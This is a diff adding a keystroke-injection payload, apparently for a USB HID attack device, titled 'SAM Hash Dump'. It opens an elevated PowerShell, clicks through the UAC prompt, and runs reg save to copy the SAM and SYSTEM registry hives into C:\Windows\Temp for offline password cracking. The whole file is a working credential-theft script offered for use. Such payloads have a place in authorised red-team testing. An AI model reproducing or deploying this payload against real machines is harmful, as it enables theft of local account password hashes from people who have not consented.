@@ -1,0 +1,27 @@
+NAME SAM Hash Dump
+DESCRIPTION Exports SAM and SYSTEM registry hives for offline cracking
+CATEGORY credential
+PLATFORMS WIN
+OPTION DELAY 2000 "Initial HID delay (ms)"
+PLATFORM WIN
+DELAY {{DELAY}}
+LED_COLOR RED
+GUI r
+DELAY 800
+STRING powershell
+HOLD CTRL
+HOLD SHIFT
+ENTER
+RELEASE SHIFT
+RELEASE CTRL
+DELAY 2000
+ALT y
+DELAY 1500
+STRINGLN reg save HKLM\SAM C:\Windows\Temp\sam.hiv /y
+DELAY 1000
+STRINGLN reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv /y
+DELAY 1000
+LED_COLOR GREEN
+STRINGLN echo SAM+SYSTEM saved to C:\Windows\Temp\
+STRING exit
+ENTER
